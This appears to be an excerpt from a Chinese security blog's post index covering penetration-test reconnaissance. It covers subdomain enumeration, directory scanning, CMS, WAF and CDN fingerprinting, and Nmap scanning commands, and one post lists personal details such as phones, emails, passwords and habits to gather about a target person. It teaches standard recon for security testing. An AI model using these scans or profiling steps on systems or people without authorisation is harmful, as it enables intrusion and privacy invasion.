src="https://img-blog.csdnimg.cn/20200408203654464.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408203707821.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408203721102.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408203738445.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408203754317.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 内网信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网信息收集--手动收集&amp;自动信息收集&amp;Empire下的主机信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集  子域名&amp;目录扫描</title>
      <link href="/2020/04/18/%E5%AD%90%E5%9F%9F%E5%90%8D&amp;%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/04/18/%E5%AD%90%E5%9F%9F%E5%90%8D&amp;%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-子域名收集的作用"><a href="#0x00-子域名收集的作用" class="headerlink" title="0x00 子域名收集的作用##"></a>0x00 子域名收集的作用##</h2><p>一、扩大渗透测试范围</p><p>二、找到目标站点突破口</p><p>三、业务边界安全</p><h2 id="0x01-常见的子域盲区"><a href="#0x01-常见的子域盲区" class="headerlink" title="0x01 常见的子域盲区"></a>0x01 常见的子域盲区</h2><p>子域名打开就是404页面、403页面怎么做<br><img src="https://img-blog.csdnimg.cn/20200403190758626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">案例：<br>前辈如何发现ucweb.com的两个XSS<br> <a href="https://nosec.org/home/detail/2011.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2011.html</a></p><h2 id="常见的子域名收集方法"><a href="#常见的子域名收集方法" class="headerlink" title="常见的子域名收集方法"></a>常见的子域名收集方法</h2><h2 id="0x03-在线收集子域名"><a href="#0x03-在线收集子域名" class="headerlink" title="0x03  在线收集子域名"></a>0x03  在线收集子域名</h2><p>一、谷歌语法</p><p>通过特定站点范围查询子域：site:qq.com<br><img src="https://img-blog.csdnimg.cn/20200403191124265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>二、在线爆破 </p><p>在线枚举爆破:<a href="http://phpinfo.me/domain/" target="_blank" rel="noopener">http://phpinfo.me/domain/</a><br><img src="https://img-blog.csdnimg.cn/20200403191211158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>三、证书搜索</p><p>基于SSL证书查询子域：<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a><br><img src="https://img-blog.csdnimg.cn/2020040319140996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>四、DNS搜索</p><p>基于DNS记录查询子域：<a href="https://dns.bufferover.run/dns?q=" target="_blank" rel="noopener">https://dns.bufferover.run/dns?q=</a></p><p><img src="https://img-blog.csdnimg.cn/20200403191656559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x04-子域收集-–-Fuzzdomain工具"><a href="#0x04-子域收集-–-Fuzzdomain工具" class="headerlink" title="0x04 子域收集 – Fuzzdomain工具"></a>0x04 子域收集 – Fuzzdomain工具</h2><p>使用github下载相应的子域发现工具<br>git clone <a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p><p>一、 安装模块<br>sudo pip install -r requirements.txt</p><p>二、 枚举目标子域</p><p>python sublist3r.py -d aqlab.cn<br><img src="https://img-blog.csdnimg.cn/20200403192340472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>三、枚举子域并且显示开放80和443端口的子域</p><p>python sublist3r.py -d aqlab.cn -p 80,443</p><p><img src="https://img-blog.csdnimg.cn/20200403192555931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>四、枚举目标子域并保存<br>Python shublist3r.py -d aqlab.cn -o aqlab.txt<br><img src="https://img-blog.csdnimg.cn/20200403192952338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">通过目标站点的用户事件找到子域以及敏感信息</p><p>一、历史漏洞</p><p>乌云镜像： 127.0.0.1<br><img src="https://img-blog.csdnimg.cn/20200403193126826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>二、使用手册、通知</p><p>学院通知：<a href="https://www.csust.edu.cn/jtxy/info/1124/17961.htm" target="_blank" rel="noopener">https://www.csust.edu.cn/jtxy/info/1124/17961.htm</a><br><img src="https://img-blog.csdnimg.cn/20200403193219525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x05-目录扫描的作用"><a href="#0x05-目录扫描的作用" class="headerlink" title="0x05 目录扫描的作用"></a>0x05 目录扫描的作用</h2><p><strong>文件目录</strong><br>文件目录是指：为实现“按名存取”，必须建立文件名与辅存空间中物理地址的对应关系，体现这种对应关系的数据结构称为文件目录。</p><p><strong>目录扫描</strong><br>目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。<br>通过目录扫描我们还能扫描敏感文件，后台文件，数据库文件，和信息泄露文件，等等<br>                                                                                                                     —-<strong>信息收集的重要部分</strong></p><h2 id="0x06-常见的目录信息泄露"><a href="#0x06-常见的目录信息泄露" class="headerlink" title="0x06 常见的目录信息泄露"></a>0x06 常见的目录信息泄露</h2><p><strong>1.目录遍历漏洞</strong><br>目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以使web根目录以外的文件），甚至执行系统命令<br>目录遍历漏洞原理<br>程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件</p><p><strong>2.敏感信息泄露</strong><br>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到</p><p><strong>比如:<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;（sql注入）<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</strong></p><p><strong>3.目录遍历<br>当没有默认网页时，在网站上显示Web服务器显示用户列表中的文件和目录。因此，在apahce服务器上面默认文件名为Index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。</strong></p><p>实例：<br>攻击者浏览目录并访问Web应用程序的源代码，备份和可能的数据库文件。<br><img src="https://img-blog.csdnimg.cn/20200403205709694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">源码泄露案例： <a href="http://www.sohu.com/a/192064346_653604" target="_blank" rel="noopener">http://www.sohu.com/a/192064346_653604</a></p><h2 id="0x07-使用御剑扫描敏感目录"><a href="#0x07-使用御剑扫描敏感目录" class="headerlink" title="0x07 使用御剑扫描敏感目录"></a>0x07 使用御剑扫描敏感目录</h2><p>御剑<br>御剑也是一款好用的网站后台扫描工具，图形化页面，使用起来简单上手</p><p><img src="https://img-blog.csdnimg.cn/2020040319383547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x08-robots-txt文件的作用"><a href="#0x08-robots-txt文件的作用" class="headerlink" title="0x08 robots.txt文件的作用"></a>0x08 robots.txt文件的作用</h2><p>Robots协议<br>（也称为爬虫协议、机器人协议等）全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p><p>Robots.txt文件的重要性<br>robots.txt是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据robots.txt文件的内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减少搜索引擎蜘蛛的工作量。</p><p>Robots.txt文件的存放位置<br>网站根目录下，通过“域名/robots.txt”能正常访问即可，如http://域名/robots.txt<br>写法<a href="https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 子域名&amp;目录扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集之CMS指纹识别</title>
      <link href="/2020/04/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCMS%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
      <url>/2020/04/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCMS%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集之CMS指纹识别"><a href="#信息收集之CMS指纹识别" class="headerlink" title="信息收集之CMS指纹识别"></a>信息收集之CMS指纹识别</h2><h2 id="0x00-了解cms指纹识别"><a href="#0x00-了解cms指纹识别" class="headerlink" title="0x00 了解cms指纹识别"></a>0x00 了解cms指纹识别</h2><p>快速搭建网站的内容管理系统<br><img src="https://img-blog.csdnimg.cn/20200404123807506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">快速二次开发的web应用框架，例如网站，小程序。<br><img src="https://img-blog.csdnimg.cn/20200404123849183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x01-指纹的特性"><a href="#0x01-指纹的特性" class="headerlink" title="0x01 指纹的特性"></a>0x01 指纹的特性</h2><p><img src="https://img-blog.csdnimg.cn/202004041239528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-指纹的识别方式"><a href="#0x02-指纹的识别方式" class="headerlink" title="0x02 指纹的识别方式"></a>0x02 指纹的识别方式</h2><p>在线和离线的方式收集指纹信息</p><p>一、云悉在线：<br><a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a><br><img src="https://img-blog.csdnimg.cn/20200404124242787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>二、 Whatweb：<br><a href="http://www.whatweb.net" target="_blank" rel="noopener">http://www.whatweb.net</a><br><img src="https://img-blog.csdnimg.cn/20200404124401271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>三、 插件：wappalyzer<br><a href="https://www.wappalyzer.com" target="_blank" rel="noopener">https://www.wappalyzer.com</a><br><img src="https://img-blog.csdnimg.cn/20200404124438601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">四、 脚本：<br>CMSeek：<br><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/CMSeeK</a></p><p>命令：<code>python3 cmseek -u 目标</code><br><img src="https://img-blog.csdnimg.cn/20200404130936428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Webfinger：<br><a href="https://github.com/se55i0n/Webfinger" target="_blank" rel="noopener">https://github.com/se55i0n/Webfinger</a></p><h2 id="0x03-WAF-–-介绍"><a href="#0x03-WAF-–-介绍" class="headerlink" title="0x03 WAF – 介绍"></a>0x03 WAF – 介绍</h2><p>   <strong>Waf的全拼为：Web Application Firewall，顾名思义Waf是一款专针对Web应用攻击的防护产品。当Web应用越来越丰富的同时，大部分交互都转移到了Web上，与此同时Web也成为了主要的攻击目标，此时Waf就成为了安全防护中的第一道防线，Waf在安全中的重要性不言而喻。</strong><br><img src="https://img-blog.csdnimg.cn/20200404131915648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>WAF – 检测</strong><br>检测脚本：wafw00f</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a><br><img src="https://img-blog.csdnimg.cn/20200404132608488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x04-CDN-–-探测-尝试寻找真实ip"><a href="#0x04-CDN-–-探测-尝试寻找真实ip" class="headerlink" title="0x04 CDN – 探测(尝试寻找真实ip)"></a>0x04 CDN – 探测(尝试寻找真实ip)</h2><p>CDN – 介绍<br><img src="https://img-blog.csdnimg.cn/20200404133059824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用在线以及离线的方式检测CDN<br>CDN云观测：<br><a href="http://cdn.chinaz.com/" target="_blank" rel="noopener">http://cdn.chinaz.com/</a><br><img src="https://img-blog.csdnimg.cn/20200404133706436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">脚本探测：xcdn</p><p><a href="https://github.com/3xp10it/xcdn" target="_blank" rel="noopener">https://github.com/3xp10it/xcdn</a><br>命令：<code>python3 xcdn.py www.baidu.com</code><br><img src="https://img-blog.csdnimg.cn/20200404135138982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x05-常见绕过CDN的方法"><a href="#0x05-常见绕过CDN的方法" class="headerlink" title="0x05 常见绕过CDN的方法"></a>0x05 常见绕过CDN的方法</h2><p><img src="https://img-blog.csdnimg.cn/20200404135234815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMS指纹识别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集   端口扫描-Nmap</title>
      <link href="/2020/04/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20%20%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-Nmap/"/>
      <url>/2020/04/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20%20%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-Nmap/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-nmap简介"><a href="#0x00-nmap简介" class="headerlink" title="0x00 nmap简介"></a>0x00 nmap简介</h2><p>号称扫描器之王的Nmap</p><p> Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)，它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。</p><h2 id="0x01-Nmap的一些功能"><a href="#0x01-Nmap的一些功能" class="headerlink" title="0x01 Nmap的一些功能"></a>0x01 Nmap的一些功能</h2><p><strong>一 、检测存活在网络上的主机（主机发现）<br>二、 检测主机上开放的端口（端口发现或枚举）<br>三、 检测到相应的端口（服务发现）的软件和版本<br>四、 检测操作系统，硬件地址，以及软件版本<br>五、 检测脆弱性的漏洞（Nmap的脚本）</strong></p><h2 id="0x02-常用的端口扫描指令"><a href="#0x02-常用的端口扫描指令" class="headerlink" title="0x02 常用的端口扫描指令"></a>0x02 常用的端口扫描指令</h2><p><strong>-sS :     TCP SYN扫描<br>-p:         指定端口号扫描<br>-v：      显示扫描过程<br>-F：    快速扫描<br>-Pn：   禁止ping后扫描: 跳过主机发现的过程进行端口扫描<br>-A：     全面的系统扫描:包括打开操作系统探测、版本探测、脚本扫描、路径跟踪</strong><br><strong>sU :             UDP扫描<br>-sT:              TCP扫描<br>-sV：        扫描系统版本和程序版本检测<br>-n：        禁止反向域名解析<br>-R:        反向域名解析<br>-6:        启用IPV6扫描<br>–scrpt=vuln     全面的漏洞扫描</strong></p><p><strong>扫描指定IP开放端口</strong><br><strong>命令:<br>nmap –sS -p 端口号 -v 192.168.1.2<br>命令：<br>nmap -Pn -A 192.168.1.2<br>服务器禁止ping命令，试试-Pn，nmap参数配合使用**</strong></p><p><strong>漏洞扫描<br>命令:<br>nmap –script=vuln 59.63.200.79<br>使用vuln脚本进行全面的漏洞扫描<br>指纹识别扫描<br>命令：<br>nmap -sV -v 192.168.0.161<br>扫描系统和程序版本号检测，并且输出详细信息</strong></p><h2 id="0x03-nmap-端口扫描的状态"><a href="#0x03-nmap-端口扫描的状态" class="headerlink" title="0x03 nmap-端口扫描的状态"></a>0x03 nmap-端口扫描的状态</h2><p><strong>Opend：端口开启<br>Closed：  端口关闭<br>Filtered：端口被过滤，数据没有到达主机，返回的结果为空，数据被防火墙<br>Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态<br>Open|filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中<br>Closed|filtered：关闭或者被过滤，只发生在IP ID idle扫描</strong></p><h2 id="0x04使用Nmap中的脚本进行信息收集"><a href="#0x04使用Nmap中的脚本进行信息收集" class="headerlink" title="0x04使用Nmap中的脚本进行信息收集"></a>0x04使用Nmap中的脚本进行信息收集</h2><p><strong>一、whois信息查询</strong><br><strong>脚本保存位置：/usr/share/nmap/scripts<br>Whois信息脚本：</strong></p><p><img src="https://img-blog.csdnimg.cn/20200402211006428.png" alt="在这里插入图片描述"><strong>命令:<br>nmap -–script=whois-domain shop.aqlab.cn<br>使用whois脚本对站点进行whois信息查询</strong></p><p><img src="https://img-blog.csdnimg.cn/20200402212558284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>二、DNS解析查询</p><p>DNS解析爆破扫描<br><img src="https://img-blog.csdnimg.cn/20200402212627793.png" alt="在这里插入图片描述"><br>命令:<br>nmap –script=dns-brute shop.aqlab.cn</p><p>使用DNS爆破脚本进行dns解析扫描<br><img src="https://img-blog.csdnimg.cn/20200402211310693.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x05-把Nmap扫描结果保存到本地"><a href="#0x05-把Nmap扫描结果保存到本地" class="headerlink" title="0x05 把Nmap扫描结果保存到本地"></a>0x05 把Nmap扫描结果保存到本地</h2><p>一、标准保存 </p><p>二、保存为xml格式</p><p>标准保存<br>命令:<br>nmap –oN test.txt shop.aqlab.cn<br><img src="https://img-blog.csdnimg.cn/2020040221373762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>标准保存会包输出结果保存到指定文件<br>保存为Xml格式<br>命令:<br>nmap –oX test.xml shop.aqlab.cn</p><p>保存为xml格式需要用<img src="https://img-blog.csdnimg.cn/20200402213942210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">浏览器打开，查看结果</p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 端口扫描-nmap信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试的灵魂信息收集</title>
      <link href="/2020/04/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E7%81%B5%E9%AD%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2020/04/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E7%81%B5%E9%AD%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集的作用"><a href="#信息收集的作用" class="headerlink" title="信息收集的作用"></a>信息收集的作用</h2><h2 id="0x00-为什么要进行信息收集？"><a href="#0x00-为什么要进行信息收集？" class="headerlink" title="0x00 为什么要进行信息收集？"></a>0x00 为什么要进行信息收集？</h2><p>当我们要对一个目标进行渗透测试的时候为了防止无从下手，我们首先要获得目标的信息，掌握详细情况，了解目标的弱点和安装短板，知己知彼，才能百战不殆。</p><p>在渗透测试时信息收集是我们的第一步，信息收集的全面性对于后期的渗透工作必为重要，甚至关联到能不能挖掘到漏洞<br><img src="https://img-blog.csdnimg.cn/20200402183814914.png" alt="在这里插入图片描述"></p><h2 id="0x01-信息收集收集什么？举个栗子"><a href="#0x01-信息收集收集什么？举个栗子" class="headerlink" title="0x01 信息收集收集什么？举个栗子"></a>0x01 信息收集收集什么？举个栗子</h2><p><img src="https://img-blog.csdnimg.cn/20200402184426462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-信息收集收集什么？"><a href="#0x02-信息收集收集什么？" class="headerlink" title="0x02 信息收集收集什么？"></a>0x02 信息收集收集什么？</h2><p><img src="https://img-blog.csdnimg.cn/20200402184035656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong><strong>总结：</strong></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>目标人物</span><br><span class="line">  电话，邮箱，密码，幸运数字</span><br><span class="line"><span class="number">2.</span>目标环境</span><br><span class="line">  宿舍 教室 </span><br><span class="line"><span class="number">3.</span>目标事件</span><br><span class="line"> 周末常去XXXX地方玩</span><br><span class="line"> 喜欢周末去喝奶茶。</span><br><span class="line"></span><br><span class="line">总之就是收集一切对我们有用的信息</span><br></pre></td></tr></table></figure><h2 id="0x03-通过信息收集能干嘛？"><a href="#0x03-通过信息收集能干嘛？" class="headerlink" title="0x03 通过信息收集能干嘛？"></a>0x03 通过信息收集能干嘛？</h2><p>当然是加以利用，因为渗透测试的灵魂就是信息收集。</p><p>在实战中，我们要对某某站点进行渗透，那么就要先信息收集。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>目标站点</span><br><span class="line">管理员电话，邮箱，密码</span><br><span class="line"><span class="number">2.</span>目标环境</span><br><span class="line">域名，脚本语言，数据库，中间件，框架，cms，开放端口。</span><br><span class="line"><span class="number">3.</span>目标事件</span><br><span class="line">历史漏洞，使用手册，使用说明，通知，公众号。</span><br></pre></td></tr></table></figure><p><strong>例子1：<br>如果我们通过信息收集知道了某站点是个cms，并且存在漏洞，那么我们就可以进行通杀漏洞的直接攻击</strong></p><p><strong>例子2：<br>有些危险端口开放了我们就可以尝试入侵，例如 445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站</strong></p><h2 id="0x04-信息收集报告编写"><a href="#0x04-信息收集报告编写" class="headerlink" title="0x04 信息收集报告编写"></a>0x04 信息收集报告编写</h2><p><img 